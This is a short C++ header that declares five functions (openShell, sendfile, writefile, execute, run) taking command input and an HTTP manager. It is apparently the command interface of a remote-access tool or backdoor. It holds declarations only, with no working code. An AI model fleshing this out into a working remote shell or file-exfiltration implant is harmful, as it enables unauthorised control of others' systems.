#ifndef DIRTYMODULES_H
#define DIRTYMODULES_H

#include "requests.h"

void openShell(commandInput cmd,httpManager &manager);

void sendfile(commandInput cmd,httpManager &manager);

void writefile(commandInput cmd,httpManager &manager);

void execute(commandInput cmd,httpManager &manager);

void run(commandInput cmd,httpManager &manager);

#endif